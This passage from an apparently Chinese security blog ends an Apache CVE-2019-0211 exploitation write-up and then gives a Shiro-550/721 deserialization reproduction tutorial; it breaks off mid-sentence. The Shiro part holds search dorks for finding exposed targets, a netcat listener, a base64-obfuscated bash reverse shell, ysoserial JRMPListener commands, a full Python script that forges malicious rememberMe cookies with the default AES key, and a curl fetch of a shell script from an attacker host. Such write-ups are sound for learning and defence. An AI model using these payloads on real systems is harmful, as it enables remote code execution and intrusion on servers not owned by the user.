class="hljs-type">apr_proc_mutex_t</span> &#123;<br><br>    <span class="hljs-type">apr_pool_t</span> *pool;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">apr_proc_mutex_unix_lock_methods_t</span> *meth; &lt;--<br><br>    <span class="hljs-type">int</span> curr_locked;<br><br>    <span class="hljs-type">char</span> *fname;<br><br> <br><br>    ...<br><br>&#125;<br><br> <br><br><span class="hljs-type">apr_proc_mutex_unix_lock_methods_t</span> &#123;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><br>    <span class="hljs-built_in">apr_status_t</span> (*create)(<span class="hljs-type">apr_proc_mutex_t</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*acquire)(<span class="hljs-type">apr_proc_mutex_t</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*tryacquire)(<span class="hljs-type">apr_proc_mutex_t</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*release)(<span class="hljs-type">apr_proc_mutex_t</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*cleanup)(<span class="hljs-type">void</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*child_init)(<span class="hljs-type">apr_proc_mutex_t</span> **, <span class="hljs-type">apr_pool_t</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *); &lt;--<br><br>    <span class="hljs-built_in">apr_status_t</span> (*perms_set)(<span class="hljs-type">apr_proc_mutex_t</span> *, <span class="hljs-type">apr_fileperms_t</span>, <span class="hljs-type">apr_uid_t</span>, <span class="hljs-type">apr_gid_t</span>);<br><br>    apr_lockmech_e mech;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>all_buckets[0]-&gt;mutex会定位在同一个all_buckets[0]的内存区域，考虑到meth是一个静态结构，它会定位到libapr的data上，又因为meth指向了libapr的函数，所以每一个函数的指针都在libapr的text内。</p><p>到这里我们通过&#x2F;proc&#x2F;self&#x2F;maps有了整片内存区域的地址信息，我们可以通过修改Apache内存的指针来找到all_buckets[0]对应的结构位置。</p><p>和我之前说的一样，all_bucket的地址在每次重启都会发生变化。所以说每次触发我们的exp，all_buckets的地址都会发生变化。之后我们会研究如何解决这问题。</p><h3 id="2-向共享内存空间（SHM）写入假的prefork-child-bucket结构"><a href="#2-向共享内存空间（SHM）写入假的prefork-child-bucket结构" class="headerlink" title="2. 向共享内存空间（SHM）写入假的prefork_child_bucket结构"></a>2. 向共享内存空间（SHM）写入假的prefork_child_bucket结构</h3><p>实现函数的调用</p><p>如下是构造的调用函数的过程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bucket_id = ap_scoreboard_image-&gt;parent[id]-&gt;bucket<br><br>my_bucket = all_buckets[bucket_id]<br><br>mutex = &amp;my_bucket-&gt;mutex<br><br><span class="hljs-built_in">apr_proc_mutex_child_init</span>(mutex)<br><br>(*mutex)-&gt;meth-&gt;<span class="hljs-built_in">child_init</span>(mutex, pool, fname)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408900.png" alt="img"></p><p>调用适合的函数</p><p>要实现漏洞利用，我们需要让(*mutex)-&gt;meth-&gt;child_init指向zend_object_std_dtor(zend_object *object)，也就是下面的利用过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">mutex = &amp;my_bucket-&gt;mutex<br><br>[<span class="hljs-keyword">object</span> = mutex]<br><br><span class="hljs-title function_ invoke__">zend_object_std_dtor</span>(<span class="hljs-keyword">object</span>)<br><br>ht = <span class="hljs-keyword">object</span>-&gt;properties<br><br><span class="hljs-title function_ invoke__">zend_array_destroy</span>(ht)<br><br><span class="hljs-title function_ invoke__">zend_hash_destroy</span>(ht)<br><br>val = &amp;ht-&gt;arData[<span class="hljs-number">0</span>]-&gt;val<br><br>ht-&gt;<span class="hljs-title function_ invoke__">pDestructor</span>(val)<br></code></pre></td></tr></table></figure><p>pDestructor指向system, &amp;ht-&gt;arData[0]-&gt;val是一个字符串.</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408003.png" alt="img"></p><h3 id="3-令all-bucket-bucket-指向结构"><a href="#3-令all-bucket-bucket-指向结构" class="headerlink" title="3.令all_bucket[bucket]指向结构"></a>3.令all_bucket[bucket]指向结构</h3><p>问题和解决思路</p><p>到这里为止，如果all_bucket的地址每次重启不会改变，那么我们的利用过程就完成了。</p><ul><li>通过PHP的堆获取内存的读写权限</li><li>通过结构匹配来找到all_bucket</li><li>找到SHM中需要的结构</li><li>改变SHM中的process_score.bucket，使得all_bucket[bucket]-&gt;mutex指向我们的paylaod</li></ul><p>但考虑到all_bucket地址的变化，我们还需要做两件事情来提高我们的执行成功率：喷射SHM内存区域，用上每一个PID对应的process_socre结构。</p><p>喷射共享的内存区域</p><p>如果all_bucket的新地址距离旧的地址不远，my_bucket会指向最近的结构，从而喷射获得整个SHM中未被使用的空间，而不是仅仅获得一个指向SHM的指针。这里存在一个问题，结构在zend_object中也使用着，所以其中有(5*8&#x3D;)40位属于zend_object.properties，导致用一个大的结构来占用这个小的空间也不行。所以我们采用两个结构apr_proc_mutex_t和zend_array占用剩余的共享内存，令prefork_child_bucket.mutex和zend_object.properties指向同一个地址，来解决这一问题。现在如果all_bucket在原始地址不远的地方，my_bucket就会喷射到这一范围。</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408186.png" alt="img"></p><p>利用所有的process_score</p><p>每一个Apache Worker进程都会有一个关联的process_score结构和对应的bucket的index值。无需改变process_score.bucket值，我们就能改变他们占用的内存范围，比如说：</p><p>ap_scoreboard_image-&gt;parent[0]-&gt;bucket &#x3D; -10000 -&gt; 0x7faabbcc00 &lt;&#x3D; all_buckets &lt;&#x3D; 0x7faabbdd00</p><p>ap_scoreboard_image-&gt;parent[1]-&gt;bucket &#x3D; -20000 -&gt; 0x7faabbdd00 &lt;&#x3D; all_buckets &lt;&#x3D; 0x7faabbff00</p><p>ap_scoreboard_image-&gt;parent[2]-&gt;bucket &#x3D; -30000 -&gt; 0x7faabbff00 &lt;&#x3D; all_buckets &lt;&#x3D; 0x7faabc0000</p><p>这意味着我们的成功率随着Apache Worker进程数量的增多而变大。每次重新生成Worker进程的时候，都只有一个Worker进程会获得buckek编号，但考虑到其他Worker进程会报错而立刻重新生成，因此这不是什么问题。</p><p>复现成功率</p><p>不同的Apache服务器有着不同数量的Worker进程，有更多的Worker进程意味着我们可以用更少的内存来喷射互斥锁的地址，也就是说可以获取到更多的all_buckets函数的index信息。因此越多的Worker进程数量能够提高我们测试的成功率。在我的测试服务器（默认使用了4个Worker进程）上有80%的成功率。</p><p>如果exp触发失败的话，它会在第二天重启的时候重新运行，Apache的错误日志中不会包含Worker进程的错误信息。</p><h3 id="4-等到早上6-25查看exp是否成功触发"><a href="#4-等到早上6-25查看exp是否成功触发" class="headerlink" title="4. 等到早上6.25查看exp是否成功触发"></a>4. 等到早上6.25查看exp是否成功触发</h3><p>这里只需要等待就好了。</p><p>Poc地址：</p><p><a href="https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache">https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550、721漏洞复现</title>
    <link href="/2025/02/19/shiro550%E3%80%81721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/19/shiro550%E3%80%81721%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro550、721漏洞复现"><a href="#Shiro550、721漏洞复现" class="headerlink" title="Shiro550、721漏洞复现"></a>Shiro550、721漏洞复现</h1><h2 id="一、啥是shiro"><a href="#一、啥是shiro" class="headerlink" title="一、啥是shiro"></a>一、啥是shiro</h2><p>Apache shiro 是一个常用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。<br>Shiro提供了应用程序安全性API来执行以下方面：[api框架内置了大量api]<br>1.身份验证：证明用户身份，通常称为用户”登录”；<br>2.授权：访问控制；<br>3.密码术：保护或隐藏数据以防窥视；<br>4.会话管理：每个用户的时间敏感状态。</p><h3 id="shiro框架可能会出现的场景"><a href="#shiro框架可能会出现的场景" class="headerlink" title="shiro框架可能会出现的场景"></a>shiro框架可能会出现的场景</h3><p>以下是关于 Apache Shiro 框架应用场景的汇总表格</p><table><thead><tr><th><strong>应用场景</strong></th><th><strong>核心用途</strong></th><th><strong>典型场景</strong></th></tr></thead><tbody><tr><td><strong>Web 应用的安全管理</strong></td><td>• 用户登录认证（如登录框逻辑）<br>• 权限控制（页面&#x2F;操作限制）<br>• 会话管理（防止会话劫持）</td><td>• 电商平台（角色区分权限）<br>• OA 系统（部门数据隔离）</td></tr><tr><td><strong>企业级应用的权限控制</strong></td><td>• 多角色分层授权（管理员、员工）<br>• 敏感数据加密（如 AES 加密）</td><td>• 银行系统（交易记录加密）<br>• 医疗系统（患者隐私保护）</td></tr><tr><td><strong>分布式系统与微服务</strong></td><td>• 单点登录（SSO）<br>• 分布式会话管理（如 Redis 共享会话）</td><td>• 微服务电商平台（一次登录访问多子系统）</td></tr><tr><td><strong>移动应用与 API 安全</strong></td><td>• Token 认证（如 JWT）<br>• API 接口权限控制（限制第三方调用）</td><td>• 移动银行 App（交易 API 加密验证）</td></tr><tr><td><strong>轻量级替代方案</strong></td><td>• 配置简单，适合中小项目快速集成<br>• 独立性强，无需依赖 Spring 生态</td><td>• 初创团队内部管理系统（快速开发）</td></tr></tbody></table><h2 id="二、历史漏洞"><a href="#二、历史漏洞" class="headerlink" title="二、历史漏洞"></a>二、历史漏洞</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Shiro</span> rememberMe反序列化远程代码执行漏洞 Apache Shiro &lt;= <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">Shiro</span>-<span class="hljs-number">721</span> rememberMe 反序列化远程代码执行漏洞 Apache Shiro &lt;= <span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Shiro ≤1.2.4 版本中，AES 加密的默认密钥<strong>直接硬编码在 Shiro 框架的 Java 源码中</strong>，例如在 <code>AbstractRememberMeManager</code> 类的初始化代码中</p><h2 id="三、漏洞发现"><a href="#三、漏洞发现" class="headerlink" title="三、漏洞发现"></a>三、漏洞发现</h2><h3 id="shiro组件的发现"><a href="#shiro组件的发现" class="headerlink" title="shiro组件的发现"></a>shiro组件的发现</h3><p>在访问及登录时抓包，如果响应头 set-cookie 中显示 rememberMe&#x3D;deleteMe ，说<br>明使用了 Shiro 组件。</p><h3 id="shiro漏洞搜索"><a href="#shiro漏洞搜索" class="headerlink" title="shiro漏洞搜索"></a>shiro漏洞搜索</h3><p>通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。<br>例如fofa的搜索关键词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markup">header=&quot;rememberme=deleteMe&quot;<br>header=&quot;shiroCookie&quot;<br></code></pre></td></tr></table></figure><h3 id="漏洞检测工具"><a href="#漏洞检测工具" class="headerlink" title="漏洞检测工具"></a>漏洞检测工具</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fupinglee/</span>ShiroScan<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sv3nbeast/</span>ShiroScan<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/insightglacier/</span>Shiro_exploit<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Ares-X/</span>shiro-exploit<br></code></pre></td></tr></table></figure><h2 id="四、Shiro-550漏洞原理"><a href="#四、Shiro-550漏洞原理" class="headerlink" title="四、Shiro-550漏洞原理"></a>四、Shiro-550漏洞原理</h2><h3 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h3><p>Apache Shiro 框架提供了记住密码的功能（ RememberMe ），关闭浏览器再次访问时无需再登录即可访问。这种功能的实现是因为rememberme中存储着用于验证用户的令牌id啥的  </p><p>首先要清楚流程：首先用户再次登录同一个网站时浏览器就会发送第一次登陆成功后已经生成的 在cookie中的rememberme的值到服务端然后服务端得到请求的数据包的时候<strong>获取cookie中rememberMe的值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化</strong> 。</p><p>我们最终要实现的目的是： 通过利用反序列化实现命令执行所以我们就要让我们所构造的恶意序列化字符串进行<strong>AES加密—&gt;Base64加密—&gt;rememberme的值</strong>想要实现这个过程我们只需要知道<strong>AES密钥</strong>即可完成</p><p>用户登录成功后用户信息会经过加密编码后存储在 cookie中。在 Cookie 读取过程中有用 AES 对 Cookie 中的<strong>rememberMe</strong>解密的过程，对于 AES 这类对称加密算法，一旦密钥泄露加密便形同虚设。若秘钥可控，同时cookie中rememberMe的值是由攻击者构造的恶意 Payload ，就可以将流程走通，触发危险的 Java 反序列化，从而导致远程命令执行漏洞</p><p><code>像是AES这种的只是需要一个私钥即可完成加解密操作的加密方式就是对称加密 而像是RSA加密的话就是一个非对称加密因为在加密的时候需要使用一个公钥但是想要解密的话是需要一个私钥 这里的公钥和私钥是一对 但是不能仅凭其中一个推导出另一个</code></p><p>但是AES加密的密钥Key被<strong>硬编码</strong>在后端框架代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为 cookie 的rememberMe 字段发送。 Shiro 将 rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p><p><code>只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生 。</code></p><p>如果在返回包的 Set-Cookie 中存在 rememberMe&#x3D;deleteMe 字段，那么就可能存在此漏洞。</p><h3 id="Shiro-550漏洞中AES密钥存储位置及文件名特征总结"><a href="#Shiro-550漏洞中AES密钥存储位置及文件名特征总结" class="headerlink" title="Shiro-550漏洞中AES密钥存储位置及文件名特征总结"></a>Shiro-550漏洞中AES密钥存储位置及文件名特征总结</h3><table><thead><tr><th><strong>应用场景</strong></th><th><strong>文件名&#x2F;代码特征</strong></th><th><strong>风险说明</strong></th></tr></thead><tbody><tr><td><strong>未修复的Shiro应用</strong></td><td>代码文件：<code>DefaultSecurityManager.java</code> 密钥变量名：<code>DEFAULT_CIPHER_KEY_BYTES</code></td><td>默认密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 直接暴露，攻击者可构造恶意Cookie</td></tr><tr><td><strong>部分修复的应用</strong></td><td>文件名：<code>shiro.ini</code>、<code>config.properties</code> 配置键名：<code>securityManager.cipherKey</code></td><td>若未彻底修改默认密钥，仍可能被爆破或泄露</td></tr><tr><td><strong>自定义密钥的应用</strong></td><td>无固定文件名 代码中通过 <code>setCipherKey()</code> 方法动态设置密钥</td><td>密钥安全性高，但需确保密钥生成、存储、传递过程无漏洞</td></tr></tbody></table><h3 id="关键特征说明"><a href="#关键特征说明" class="headerlink" title="关键特征说明"></a><strong>关键特征说明</strong></h3><ol><li><p>默认密钥特征  </p><ul><li>硬编码值：Base64编码的 <code>kPH+bIxk5D2deZiIxcaaaA==</code>（解码后为16字节AES密钥）。  </li><li>代码位置：Shiro框架的 <code>AbstractRememberMeManager</code> 类初始化时直接赋值。</li></ul></li><li><p>配置文件特征  </p><ul><li>常见路径：<code>/WEB-INF/shiro.ini</code>、<code>src/main/resources/application.properties</code>。  </li><li>配置项示例：  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">securityManager.rememberMeManager.cipherKey</span> = 新密钥（Base64编码）<br></code></pre></td></tr></table></figure>若未修改或使用弱密钥，仍可被爆破工具检测（如ShiroAttack2）。</li></ul></li><li><p>攻击利用特征  </p><ul><li>Cookie字段：<code>rememberMe=deleteMe</code>（响应头标识Shiro框架）。  </li><li>密钥爆破：攻击者利用常见密钥列表（如Shiro默认密钥、常见弱密钥）生成恶意Cookie。</li></ul></li></ol><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol><li>修复方案：  <ul><li>升级到Shiro 1.2.5+，并<strong>强制修改默认密钥</strong>，使用随机生成的强密钥（如 <code>openssl rand -base64 32</code>）。  </li><li>禁止将密钥硬编码在代码或配置文件中，优先使用密钥管理系统（KMS）。</li></ul></li><li>检测方法：  <ul><li>检查代码中 <code>AbstractRememberMeManager</code> 类是否直接引用 <code>DEFAULT_CIPHER_KEY_BYTES</code>。  </li><li>使用工具扫描配置文件是否包含默认密钥或弱密钥。</li></ul></li><li>应急响应：  <ul><li>若密钥泄露，需立即轮换密钥并检查日志中异常RememberMe请求。</li></ul></li></ol><h3 id="获取shiro密钥的一些方法"><a href="#获取shiro密钥的一些方法" class="headerlink" title="获取shiro密钥的一些方法"></a>获取shiro密钥的一些方法</h3><p>一般就是爆破 （虽然说的是如果版本&lt;&#x3D;1.2.4的时候AES密钥直接硬编码到源码里但是你需要去找github的源码 比较费劲还不如直接爆破 要是爆破不出来的话可以去尝试找找但是不推荐）</p><p>另一种方法用于版本&gt;1.2.4的shiro框架 也可以爆但是可能会比较困难因为这个版本以上的shiro框架的AES密钥都是随机生成的</p><h3 id="通过脚本爆破密钥的原理"><a href="#通过脚本爆破密钥的原理" class="headerlink" title="通过脚本爆破密钥的原理"></a>通过脚本爆破密钥的原理</h3><p>因为服务端反序列化字符串的流程时获取cookie中rememberMe的值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化而我们构造恶意rememberMe的值的流程是AES加密—&gt;Base64加密—&gt;rememberme的值所以说如果我们在加密的时候所使用的AES的值是正确的那么服务端就能成功解密 如果服务器未返回 <code>deleteMe</code>，说明密钥可能正确  服务器返回 <code>rememberMe=deleteMe</code>，说明密钥错误。</p><h2 id="五、Shiro-550漏洞复现"><a href="#五、Shiro-550漏洞复现" class="headerlink" title="五、Shiro-550漏洞复现"></a>五、Shiro-550漏洞复现</h2><h4 id="条件：拿到AES密钥"><a href="#条件：拿到AES密钥" class="headerlink" title="条件：拿到AES密钥"></a>条件：拿到AES密钥</h4><p><strong>1 启动靶场</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">systemctl</span> start docker<br><span class="hljs-attribute">cd</span> shiro/CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">4437</span><br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure><p>至于具体去哪个端口访问靶场可以去瞅瞅docker-compose.yml里咋配置的</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011055660.png" alt="image-20250301105521532"></p><p><strong>2 抓包 注意对于此页面的抓包要在填写了账户密码后点击登录 抓这个包不要抓错包</strong></p><p>然后要注意的一点是他的特征是在<code>Set-Cookie:</code>中出现<code>rememberMe=deleteMe</code>而set-cookie是一定存在于响应包里的</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011101827.png" alt="image-20250301110149776"></p><p><strong>3</strong> <strong>然后</strong>因为我们下一步是去利用aes密钥去生成payload所以我们要去通过一些方法<strong>得到他的AES密钥</strong></p><p>这里我选择的是去爆破网上有很多脚本和工具去爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011615960.png" alt="image-20250301161518735"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503011615806.png" alt="image-20250301161522402"></p><p>然后下一步的思路</p><p><strong>4 首先在我的主机上选择一个端口进行监听</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><strong>5 然后利用一个工具来生成payload</strong></p><p>bash转换链接：<a href="https://ares-x.com/tools/runtime-exec[%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%B0%86%E4%B8%80%E4%B8%AA%E4%BD%A0%E6%83%B3%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E5%85%88%E8%BF%9B%E8%A1%8Cbase64%E7%BC%96%E7%A0%81%E7%84%B6%E5%90%8E%E5%86%8D%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B7%BB%E5%8A%A0%E5%91%BD%E4%BB%A4%E4%BD%BF%E5%BE%97%E8%BF%99%E4%B8%AA%E7%BB%8F%E8%BF%87base64%E7%BC%96%E7%A0%81%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8D%E7%84%B6%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%AD%E5%85%88%E8%A2%ABbase64%E8%A7%A3%E7%A0%81%E7%84%B6%E5%90%8E%E8%A2%AB%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C]">https://ares-x.com/tools/runtime-exec[这个网站可以将一个你想要执行的命令先进行base64编码然后再进一步添加命令使得这个经过base64编码的字符串仍然可以在终端中先被base64解码然后被成功执行]</a></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503042116716.png" alt="image-20250304211558578"></p><p>可以将<code>bash -i &gt;&amp; /dev/tcp/192.168.129.1/9999 0&gt;&amp;1</code>转换为                                                                                                                   <code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code> 其实这是将原来的命令进行了base64编码处理这样可以绕过一些字符检测 </p><p><strong><code>bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;&quot;|&#123;bash,-i&#125;</code></strong></p><p>以上这段代码中的<code>&#123;base64,-d&#125;</code>可以<code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzEuMTYuMS4xMDUvOTk5OSAwPiYx</code>解码为<code>bash -i &gt;&amp; /dev/tcp/171.16.1.105/9999 0&gt;&amp;1</code>  </p><p><code>&#123;bash,-i&#125;</code>可以为<code>bash -i &gt;&amp; /dev/tcp/192.168.129.1/9999 0&gt;&amp;1</code>  的执行准备好环境让其成功的执行   至于这段代码的作用是可以反连到指定的服务器上的指定的端口</p><p><strong>6 在我的主机上起一个JRMP监听器</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503051544327.png" alt="image-20250305154426130"></p><p><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections4 &quot;反弹Shell命令&quot;</code></p><p>将我们在以上第五步所处理的用于反弹shell的命令填到里面 <code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9988 CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></p><p>[以上这段代码的作用可以实现当目标主机反序列化后主动向攻击者的指定端口发起RMI通信请求时，以上这段代码会发送 双引号中的内容到被攻击者的服务器]</p><p><strong>JRMP监听器（JRMPListener）</strong> 是攻击者在反序列化漏洞中常用的工具组件，用于<strong>构造恶意RMI服务端并等待目标主动连接</strong>，从而实现远程代码执行（RCE）</p><p><strong>7 执行shiro550-exp.py脚本生成cookie中的 rememberme</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<span class="hljs-comment">#其中的AES要改成我们所爆破出来的密钥</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br><br></code></pre></td></tr></table></figure><p>注意其中需要更改的参数</p><p>然后python3 shiro550-exp.py 192.168.129.1:9988  [这里的地址是攻击这主机的ip地址端口要和前面的开放JRMP监听器的的端口相对应]</p><p> <strong>8 然后通过bp抓包将上个步骤中生成的rememberme加到cookie中</strong></p><p><strong>9 发送更改后的数据包 查看监听端是否成功反弹shell</strong></p><p>或者把反弹shell的命令写道一个shell脚本中</p><p>执行<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 11111 CommonsCollections4 &quot;curl http://171.16.1.105/zsy.sh -o /tmp/zsy.sh&quot;</code></p><p>也可以直接利用一体化工具：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503051811205.png" alt="屏幕截图 2025-03-01 122418"></p><h2 id="六、Shiro-721漏洞原理"><a href="#六、Shiro-721漏洞原理" class="headerlink" title="六、Shiro-721漏洞原理"></a>六、Shiro-721漏洞原理</h2><p>使用随机生成的 AES 密钥</p><p>漏洞成因：Apache Shiro 的 RememberMe 功能使用 <strong>AES-128-CBC 模式</strong> 对 Cookie 中的 <code>rememberMe</code> 字段进行加密。由于 CBC 模式在解密时会对填充（Padding）格式进行校验，攻击者可通过 <strong>Padding Oracle 攻击</strong> 探测填充有效性差异，逐步破解加密密钥或构造恶意密文。</p><p>关键缺陷</p><ul><li><strong>CBC 模式漏洞</strong>：CBC 加密的初始化向量（IV）直接暴露在 Cookie 中（Base64 解码后前 16 字节），且服务器会因填充错误返回差异化的响应（如 HTTP 500）</li><li><strong>密钥生成问题</strong>：Shiro ≤1.4.1 使用随机生成的 AES 密钥（非硬编码），但仍可通过 Padding Oracle 攻击动态破解</li></ul><p>影响版本：&lt;&#x3D;1.4.1</p><h4 id="条件：一个有效的-Cookie（需用户已登录）"><a href="#条件：一个有效的-Cookie（需用户已登录）" class="headerlink" title="条件：一个有效的 Cookie（需用户已登录）"></a>条件：一个有效的 Cookie（需用户已登录）</h4><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h4><ol><li><p>获取合法 Cookie</p><ul><li>攻击者需先获取一个有效的 <code>rememberMe</code> Cookie（需用户已登录）</li></ul></li><li><p>Padding Oracle 攻击</p><ul><li>利用服务器的填充错误响应，构造恶意请求，逐步破解 AES 密钥或生成符合 CBC 